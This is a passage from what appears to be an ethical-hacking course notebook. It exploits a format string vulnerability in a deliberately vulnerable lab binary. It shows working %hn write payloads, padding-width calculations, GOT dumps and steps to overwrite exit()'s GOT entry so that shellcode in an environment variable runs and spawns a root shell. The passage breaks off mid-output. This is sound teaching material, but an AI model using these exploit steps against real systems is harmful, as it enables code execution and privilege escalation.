      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\\x2a\\xc0\\x04\\x08\")%64874x%4\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-15731\n"
     ]
    }
   ],
   "source": [
    "# 0xbfff is written in last two (higher bytes)\n",
    "print(0xbfff-0xfd72)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "49805\n"
     ]
    }
   ],
   "source": [
    "# smaller than previous width so, prepend 1\n",
    "print(0x1bfff-0xfd72)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b*�\u0004\b%64874x%4$hn%49805x%5$hn\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b*�\u0004\b                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ffffbf50                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            0\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -1073742478 0xbffffd72\r\n",
      "[*] text is @ 0xffffbf50\r\n"
     ]
    }
   ],
   "source": [
    "# finally write 0xbffffd72 to test_val using 4th and 5th parameters\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\\x2a\\xc0\\x04\\x08\")%64874x%4\\$hn%49805x%5\\$hn"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Control the execution flow of the program\n",
    "- overwrite the return address in the most recent stack frame\n",
    "- stack-based overflow only allows overflowing return address\n",
    "- format string vulnerability provides the ability to overwrite any memory address the program can access\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Overwriting the Global Offset Table\n",
    "- PLT (procedure linkage table) is used to store shared library\n",
    "- consists of many jump instructions each one corresponding to the address of a function\n",
    "- each time a shared function needs to be called, control will pass through the PLT\n",
    "- objdump program can be used to see `.plt` section\n",
    "- exit() is called at the end of the program\n",
    "- if `exit()` function can be manipulated to direct the execution flow into shellcode, a root shell will be spawned\n",
    "- most of the functions are not jumping to addresses but to pointers to addresses\n",
    "    - e.g., exit() function's address is stored at `0x0804c018`\n",
    "- these addresses exist in another section, called the Global Offset Table (GOT) which is writable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "./fmt_vuln.exe:     file format elf32-i386\r\n",
      "\r\n",
      "\r\n",
      "Disassembly of section .plt:\r\n",
      "\r\n",
      "08049020 <.plt>:\r\n",
      " 8049020:\tff 35 04 c0 04 08    \tpushl  0x804c004\r\n",
      " 8049026:\tff 25 08 c0 04 08    \tjmp    *0x804c008\r\n",
      " 804902c:\t00 00                \tadd    %al,(%eax)\r\n",
      "\t...\r\n",
      "\r\n",
      "08049030 <printf@plt>:\r\n",
      " 8049030:\tff 25 0c c0 04 08    \tjmp    *0x804c00c\r\n",
      " 8049036:\t68 00 00 00 00       \tpush   $0x0\r\n",
      " 804903b:\te9 e0 ff ff ff       \tjmp    8049020 <.plt>\r\n",
      "\r\n",
      "08049040 <strcpy@plt>:\r\n",
      " 8049040:\tff 25 10 c0 04 08    \tjmp    *0x804c010\r\n",
      " 8049046:\t68 08 00 00 00       \tpush   $0x8\r\n",
      " 804904b:\te9 d0 ff ff ff       \tjmp    8049020 <.plt>\r\n",
      "\r\n",
      "08049050 <puts@plt>:\r\n",
      " 8049050:\tff 25 14 c0 04 08    \tjmp    *0x804c014\r\n",
      " 8049056:\t68 10 00 00 00       \tpush   $0x10\r\n",
      " 804905b:\te9 c0 ff ff ff       \tjmp    8049020 <.plt>\r\n",
      "\r\n",
      "08049060 <exit@plt>:\r\n",
      " 8049060:\tff 25 18 c0 04 08    \tjmp    *0x804c018\r\n",
      " 8049066:\t68 18 00 00 00       \tpush   $0x18\r\n",
      " 804906b:\te9 b0 ff ff ff       \tjmp    8049020 <.plt>\r\n",
      "\r\n",
      "08049070 <__libc_start_main@plt>:\r\n",
      " 8049070:\tff 25 1c c0 04 08    \tjmp    *0x804c01c\r\n",
      " 8049076:\t68 20 00 00 00       \tpush   $0x20\r\n",
      " 804907b:\te9 a0 ff ff ff       \tjmp    8049020 <.plt>\r\n"
     ]
    }
   ],
   "source": [
    "! objdump -d -j .plt ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "./fmt_vuln.exe:     file format elf32-i386\r\n",
      "\r\n",
      "DYNAMIC RELOCATION RECORDS\r\n",
      "OFFSET   TYPE              VALUE \r\n",
      "0804bffc R_386_GLOB_DAT    __gmon_start__\r\n",
      "0804c00c R_386_JUMP_SLOT   printf@GLIBC_2.0\r\n",
      "0804c010 R_386_JUMP_SLOT   strcpy@GLIBC_2.0\r\n",
      "0804c014 R_386_JUMP_SLOT   puts@GLIBC_2.0\r\n",
      "0804c018 R_386_JUMP_SLOT   exit@GLIBC_2.0\r\n",
      "0804c01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0\r\n",
      "\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "# display all dynamic relocations\n",
    "! objdump -R ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- NOTE: exit()'s GOT entry OFFSET - which can be overwritten with the address of smuggled shellcode\n",
    "\n",
    "## Smuggle Shellcode & Exploit\n",
    "- create shellcode using gdb-peda - see [GDB-Peda.ipynb](./GDB-Peda.ipynb) Notebook for details\n",
    "- use printf command to write 'shellcode as a binary file' > shellcode.bin\n",
    "- export shllcode as an env variable\n",
    "- find and write the address of shellcode into the address of the exit() function\n",
    "- when the program exits, it actually executes the shellcode in env variable\n",
    "\n",
    "### steps\n",
    "- stash the shellcode in env variable\n",
    "- find the address of the shellcode when the vulnerable program is loaded\n",
    "- find shared library function in GOT that's executed by the vulnerable program\n",
    "- by exploiting format string vulnerability, write the shellcode's address to the shared function's jump address\n",
    "- put it all together as a exploit code and launch it to exploit the vulnerable program\n",
    "\n",
    "### Advantage of using GOT\n",
    "- GOT entries are fixed per binary\n",
    "    - different system with the same binary will have the same GOT entry at the same address\n",
    "    \n",
    "- ability to overwrite any arbitrary address opens up many possiblilites for exploitation\n",
    "- any section of writable memory that contains an address that directs the flow of program execution can be targeted"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./shellcode/shellcode.bin ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "input=\"./demos/stack_overflow/getenvaddr.cpp\"\n",
    "output=\"getenvaddr.exe\"\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### User terminal to do complete the rest of the steps\n",
    "- create SHELLCODE env variable\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ export SHELLCODE=$(cat shellcode.bin)\n",
    "```\n",
    "- get the address of SHELLCODE env variable when ./fmt_vuln.exe program is executing\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./getenvaddr.exe SHELLCODE ./fmt_vuln.exe\n",
    "SHELLCODE will be at 0xffffdfa5 with reference to ./fmt_vuln.exe\n",
    "```\n",
    "\n",
    "- now that we know the address of shellcode, let's find out how we can write this address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%4$x\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAA41414141\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# try 1, 2, 3, 4, etc, until you see hex A's printed\n",
    "! ./fmt_vuln.exe $(printf \"AAAA\")%4\\$x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b%4$hn\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -65532 0xffff0004\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# let's write the SHELLCODE address 0xffffdfa5 to test_val\n",
    "# we can then use the calculations to write to exit function's location in GOT\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")%4\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "57245\n"
     ]
    }
   ],
   "source": [
    "# find the first width; # SHELLCODE will be at 0xffffdfa5\n",
    "# 8 bytes of addresses will be printed\n",
    "print(0xdfa5-8)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "8282\n"
     ]
    }
   ],
   "source": [
    "# find the 2nd width; # SHELLCODE will be at 0xffffdfa5\n",
    "print(0xffff-0xdfa5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b*�\u0004\b%57245x%4$hn%8282x%5$hn\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b*�\u0004\b                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             